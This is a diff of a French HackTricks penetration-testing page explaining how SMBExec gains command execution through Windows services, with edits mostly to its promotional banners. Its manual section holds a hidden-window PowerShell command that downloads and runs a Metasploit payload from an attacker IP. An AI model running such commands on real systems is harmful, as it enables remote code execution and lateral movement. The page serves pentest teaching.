@@ -2,23 +2,25 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
+Autres moyens de soutenir HackTricks :
+
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de hacking en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 ## Comment ça fonctionne
 
-**Smbexec fonctionne comme Psexec.** Dans cet exemple, **au lieu** de pointer le "_binpath_" vers un exécutable malveillant à l'intérieur de la victime, nous allons **le diriger** vers **cmd.exe ou powershell.exe** et l'un d'eux téléchargera et exécutera le backdoor.
+**Smbexec fonctionne comme Psexec.** Dans cet exemple, **au lieu** de pointer le "_binpath_" vers un exécutable malveillant à l'intérieur de la victime, nous allons **le diriger** vers **cmd.exe ou powershell.exe** et l'un d'eux téléchargera et exécutera la porte dérobée.
 
 ## **SMBExec**
 
-Voyons ce qui se passe lorsque smbexec est exécuté en regardant du côté de l'attaquant et de la cible :
+Voyons ce qui se passe lorsque smbexec est exécuté en l'observant du côté de l'attaquant et de la cible :
 
 ![](../../.gitbook/assets/smbexec\_prompt.png)
 
@@ -26,7 +28,7 @@ Nous savons donc qu'il crée un service "BTOBTO". Mais ce service n'est pas pré
 
 ![](../../.gitbook/assets/smbexec\_service.png)
 
-Le nom de fichier du service contient une chaîne de commande à exécuter (%COMSPEC% pointe vers le chemin absolu de cmd.exe). Il écho la commande à exécuter dans un fichier bat, redirige stdout et stderr vers un fichier Temp, puis exécute le fichier bat et le supprime. De retour sur Kali, le script Python récupère ensuite le fichier de sortie via SMB et affiche le contenu dans notre "pseudo-shell". Pour chaque commande que nous tapons dans notre "shell", un nouveau service est créé et le processus est répété. C'est pourquoi il n'a pas besoin de déposer un binaire, il exécute simplement chaque commande souhaitée en tant que nouveau service. Certainement plus discret, mais comme nous l'avons vu, un journal d'événements est créé pour chaque commande exécutée. Toujours une manière très ingénieuse d'obtenir un "shell" non interactif !
+Le nom de fichier du service contient une chaîne de commande à exécuter (%COMSPEC% pointe vers le chemin absolu de cmd.exe). Il écho la commande à exécuter dans un fichier bat, redirige les stdout et stderr vers un fichier Temp, puis exécute le fichier bat et le supprime. De retour sur Kali, le script Python récupère ensuite le fichier de sortie via SMB et affiche le contenu dans notre "pseudo-shell". Pour chaque commande que nous tapons dans notre "shell", un nouveau service est créé et le processus est répété. C'est pourquoi il n'est pas nécessaire de déposer un binaire, il exécute simplement chaque commande souhaitée en tant que nouveau service. Définitivement plus discret, mais comme nous l'avons vu, un journal d'événements est créé pour chaque commande exécutée. Toujours une manière très ingénieuse d'obtenir un "shell" non interactif !
 
 ## SMBExec Manuel
 
@@ -38,7 +40,7 @@ Nous utiliserons le module `web_delivery` de Metasploit et choisirons une cible 
 ```
 powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
 ```
-Depuis notre machine d'attaque Windows, nous créons un service à distance ("metpsh") et définissons le binPath pour exécuter cmd.exe avec notre charge utile :
+Depuis notre machine d'attaque Windows, nous créons un service à distance ("metpsh") et configurons le binPath pour exécuter cmd.exe avec notre charge utile :
 
 ![](../../.gitbook/assets/sc\_psh\_create.png)
 
@@ -52,12 +54,14 @@ Toutes les informations ont été extraites d'ici : [https://blog.ropnop.com/usi
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
+Autres moyens de soutenir HackTricks :
+
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
